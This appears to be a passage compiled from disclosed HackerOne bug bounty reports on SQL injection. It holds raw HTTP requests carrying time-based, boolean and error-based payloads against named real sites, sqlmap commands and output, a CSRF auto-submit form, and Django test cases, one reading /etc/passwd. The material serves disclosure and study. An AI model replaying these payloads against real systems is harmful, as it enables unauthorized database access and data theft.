       Type: boolean-based blind
       Title: OR boolean-based blind - WHERE or HAVING clause
       Payload: -5127 OR 2687=2687
```

## #1042746 [intensedebate.com] SQL Injection Time Based on /changeReplaceOpt.php — automattic — - — SQL Injection
Source: `hackerone/reports/2021/1042746.md` (https://hackerone.com/reports/1042746)

```
GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(15) HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/install-t
Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
```

```
GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(7) HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/install-t
Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
```

```
GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(15) HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/install-t
Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
'''

Response time: 15 414 millis.
```

## #3335709 SQL Injection in Django ORM via Unvalidated `_connector` in Q Objects — django — - — SQL Injection
Source: `hackerone/reports/2025/3335709.md` (https://hackerone.com/reports/3335709)

```
# Simplified representation of the vulnerable code in WhereNode.as_sql
conn = ' %s ' % self.connector
```

```
# An example of a vulnerable application pattern
filter_dictionary = request.json.get('filters', {{}})
query = Q(**filter_dictionary) # VULNERABLE LINE
results = User.objects.filter(query)
```

```
django-admin startproject sqli .
python manage.py startapp webapp
```

## #2588426 SQL injection in JSONField KeyTransform — django — - — SQL Injection
Source: `hackerone/reports/2025/2588426.md` (https://hackerone.com/reports/2588426)

```
    def test_sqli(self):

        # say a to get value b
        # say b to get value c
        # say " for syntax error in sql
        user_input = "b"

        NullableJSONModel.objects.create(value_custom={"a": "b"})
        NullableJSONModel.objects.create(value_custom={"b": "c"})
        qs = NullableJSONModel.objects.filter(value_custom__isnull=False).values(
            "value_custom__" + user_input,
        ).annotate(
            count=Count("id"),
        )

        for i in qs:
            v = i["value_custom__" + user_input]
            if v:
                print(v)
```

```
        # say a to get value b
        # say b to get value c
        # say " for syntax error in sql
        user_input = "b"
```

```
        NullableJSONModel.objects.create(value_custom={"a": "b"})
        NullableJSONModel.objects.create(value_custom={"b": "c"})
        qs = NullableJSONModel.objects.filter(value_custom__isnull=False).values(
            "value_custom__" + user_input,
        ).annotate(
            count=Count("id"),
        )
```

## #1034625 Blind SQL injection at tsftp.informatica.com — informatica — - — SQL Injection
Source: `hackerone/reports/2020/1034625.md` (https://hackerone.com/reports/1034625)

```
$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--"
{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 1% cpu 2.048 total
```

```
$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--"
{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 0% cpu 14.045 total
```

## #2599826 Boolen Based Blind Sql Injection Via User Agent in ███.mil — deptofdefense — - — SQL Injection
Source: `hackerone/reports/2025/2599826.md` (https://hackerone.com/reports/2599826)

```
   sqlmap --url https://█████████.mil/ --random-agent -risk 3 --level 5 --batch
   
```

```
   Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/523.10.3 (KHTML, like Gecko) Version/3.0.4 Safari/523.10' AND 8074=8074-- KwOG
   
```

## #1626226 Unauthenticated SQL Injection at █████████  [HtUS] — deptofdefense — - — SQL Injection
Source: `hackerone/reports/2022/1626226.md` (https://hackerone.com/reports/1626226)

```
GET /api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa HTTP/1.1
Host: ████ 
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: none 
Sec-Fetch-User: ?1 
Te: trailers
```

```
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 209
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
X-DNS-Prefetch-Control: off
Expect-CT: max-age=0
X-Frame-Options: SAMEORIGIN
X-Download-Options: noopen
X-Content-Type-Options: nosniff
Origin-Agent-Cluster: ?1
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: no-referrer
X-XSS-Protection: 0
Strict-Transport-Security: max-age=31536000
Expires: Tue, 05 Jul 2022 04:12:11 GMT
Cache-Control: max-age=0, no-cache, no-store
Pragma: no-cache
Date: Tue, 05 Jul 2022 04:12:11 GMT
Connection: keep-alive

{"statusCode":500,"code":"P2010","error":"Internal Server Error","message":"\nInvalid `prisma.queryRaw()` invocation:\n\n\n  Raw query failed. Code: `1105`. Message: `XPATH syntax error: ':█████████'`"}
```

```
GET /api/organizations/'or(extractvalue(1,concat(1,(select(table_name)from%20information_schema.tables%20limit%2054,1))))=' HTTP/1.1
Host: ████ 
User-Agent: Mozilla/5.0  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 
Accept-Encoding: gzip, deflate 
Upgrade-Insecure-Requests: 1 
Sec-Fetch-Dest: document 
Sec-Fetch-Mode: navigate 
Sec-Fetch-Site: none 
Sec-Fetch-User: ?1 
Te: trailers
```

## #876800 Time-base SQL Injection in Search Users — concretecms — - — SQL Injection
Source: `hackerone/reports/2020/876800.md` (https://hackerone.com/reports/876800)

```
POST /concrete5/index.php/ccm/system/dialogs/user/advanced_search/submit?ccm_token=1589765824:07f645727d279188e2ce2c91835ab0dd HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 399
Connection: close

field%5B%5D=keywords&keywords=admin&field%5B%5D=is_active&active=0&u.uName=1&u.uEmail=1&u.uDateAdded=1&uStatus=1&u.uNumLogins=1&column%5B%5D=u.uName&column%5B%5D=u.uEmail&column%5B%5D=u.uDateAdded&column%5B%5D=uStatus&column%5B%5D=u.uNumLogins&fSearchDefaultSort=u.uDateAdded&fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(20)))a)&fSearchItemsPerPage=10&__ccm_consider_request_as_xhr=1
```

```
POST /concrete5/index.php/ccm/system/dialogs/user/advanced_search/submit?ccm_token=1589765824:07f645727d279188e2ce2c91835ab0dd HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 399
Connection: close

field%5B%5D=keywords&keywords=admin&field%5B%5D=is_active&active=0&u.uName=1&u.uEmail=1&u.uDateAdded=1&uStatus=1&u.uNumLogins=1&column%5B%5D=u.uName&column%5B%5D=u.uEmail&column%5B%5D=u.uDateAdded&column%5B%5D=uStatus&column%5B%5D=u.uNumLogins&fSearchDefaultSort=u.uDateAdded&fSearchDefaultSortDirection=desc%2c(select*from(select(sleep(30)))a)&fSearchItemsPerPage=10&__ccm_consider_request_as_xhr=1
```

## #135288 Multiple vulnerabilities in a WordPress plugin at drive.uber.com — uber — - — SQL Injection
Source: `hackerone/reports/2016/135288.md` (https://hackerone.com/reports/135288)

```
<form action="https://drive.uber.com/ukmarketplace/wp-admin/edit.php?post_type=qa_faqs&page=faqpageorder" target="_blank"  method="post" style="display: none;">
            <input type="text" name="btnOrderPages" value="Click to Reorder FAQs" />
            <input type="text" name="hdnfaqpageorder" value="id_8,id_7" />
            <input type="text" name="hdnParentID" value="IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)" />
            <input type="text" name="btnReturnParent" value="1" />
            <input type="submit" name="send" value="Save" />
</form>
<script type="text/javascript">
document.forms[0].submit();
</script>
```

```
45. if (isset($_POST['btnReturnParent'])) { 
46. 	$parentsParent = $wpdb->get_row("SELECT post_parent FROM $wpdb->posts WHERE ID = " . $_POST['hdnParentID'], ARRAY_N);
47. 	$parentID = $parentsParent[0];
48. }
```

```
<form action="https://drive.uber.com/ukmarketplace/wp-admin/edit.php?post_type=qa_faqs&page=faqpageorder" target="_blank"  method="post" style="display: none;">
            <input type="text" name="btnOrderPages" value="Click to Reorder FAQs" />
            <input type="text" name="hdnfaqpageorder" value="id_8,id_7" />
            <input type="text" name="hdnParentID" value="" />
            <input type="text" name="pages" value="IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)" />
            <input type="text" name="btnSubPages" value="1" />
            <input type="submit" name="send" value="Save" />
</form>
<script type="text/javascript">
document.forms[0].submit();
</script>
```

## #3417967 Potential SQL Injection when annotating FilteredRelation on PostgreSQL — django — - — SQL Injection
Source: `hackerone/reports/2025/3417967.md` (https://hackerone.com/reports/3417967)

```
def test_sqli(self):
        user_data = "$a$,$b$,$c$,(1)from(select(1)id,(pg_read_file($$/etc/passwd$$))title,(3)author_id,(4)editor_id,(5)number_editor,(6)editor_number,(7)state)filtered_relation_book,(select(1),1"

        qs = (
            Book.objects.annotate(**{
                user_data: FilteredRelation(
                "editor"            ),
        })
            .select_related(user_data)
        )

        try:
            import django
            for e in qs.all():
                print("######### Injected #########")
                print(e.title)
                print("############################")
        except django.db.utils.ProgrammingError as e:
            print(f"------\n{e}")
```

```
docker run --rm -it --net=host --name some-postgis -e POSTGRES_PASSWORD=mysecretpassword -d postgres
```

```
DATABASES = {
    "default": {
        "ENGINE": "django.db.backends.postgresql",
        "NAME": "django",
        "USER": "postgres",
        "PORT": 5432,
        "HOST": "localhost"
    },
}
SECRET_KEY = "mysecretpassword"
```

## #1436751 SQL injection in https://demor.adr.acronis.com/ via the username parameter — acronis — - — SQL Injection
Source: `hackerone/reports/2024/1436751.md` (https://hackerone.com/reports/1436751)

```
POST /ng/api/auth/login HTTP/2
Host: demor.adr.acronis.com
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Referer: https://demor.adr.acronis.com/
Cookie: PHPSESSID=bsrq24l7g5fmth5b683v2b3gu4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
Content-Length: 148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36

{"username":"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z","id":"27","password":"cc4226104294e44c5cec9f31cb6de7fa4597e4321b277f4e4b78c3a0ff980956"}
```

## #384397 SQL Injection vulnerability located at ████████ — deptofdefense — - — SQL Injection
Source: `hackerone/reports/2019/384397.md` (https://hackerone.com/reports/384397)

```
python sqlmap.py -u "https://██████/████████Portal/██████████?_█████=true&_st=&_pageLabel=███_██████_pubview_page&CCD_itemID=201826*" --random-agent --current-user --is-dba
```

```
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: https://███████:443/███████Portal/████?_███=true&_st=&_pageLabel=███_█████_pubview_page&CCD_itemID=201826 AND 2833=2833

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: https://██████████:443/████Portal/██████████?_███=true&_st=&_pageLabel=███_██████████_pubview_page&CCD_itemID=201826 UNION ALL SELECT NULL,CONCAT(CONCAT('qvzxq','ODiUngdWPubxHGXaEEDvfcozGjVAMxIqpHmWfTVJ'),'qbbxq') FROM VERSIONS-- AQYh
---
[22:37:56] [INFO] testing SAP MaxDB
[22:37:57] [WARNING] the back-end DBMS is not SAP MaxDB
[22:37:57] [INFO] testing MySQL
[22:37:58] [WARNING] the back-end DBMS is not MySQL
[22:37:58] [INFO] testing Oracle
[22:37:59] [INFO] confirming Oracle
[22:38:01] [INFO] the back-end DBMS is Oracle
web application technology: Apache, Servlet 2.5, JSP, JSP 2.1
back-end DBMS: Oracle
[22:38:01] [INFO] fetching current user
current user:    ██████████
[22:38:02] [INFO] testing if current user is DBA
current user is DBA:    True
```

```
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: https://███████:443/███████Portal/████?_███=true&_st=&_pageLabel=███_█████_pubview_page&CCD_itemID=201826 AND 2833=2833
```

## #1069531 Blind SQL Injection  — mtn_group — - — SQL Injection
Source: `hackerone/reports/2021/1069531.md` (https://hackerone.com/reports/1069531)

```
POST /signin/ HTTP/1.1
Host: futexpert.mtngbissau.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Origin: https://futexpert.mtngbissau.com
Connection: close
Referer: https://futexpert.mtngbissau.com/signin/
Cookie: _ga=GA1.2.807090149.1609258213; _gid=GA1.2.432006610.1609466934; PHPSESSID=87pejs8h0usb0ill37hit63an5
Upgrade-Insecure-Requests: 1

phone_number=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2812%29%2C0%29%29XOR%27Z+%3D%3E&pin=1&submit=Continuar
```

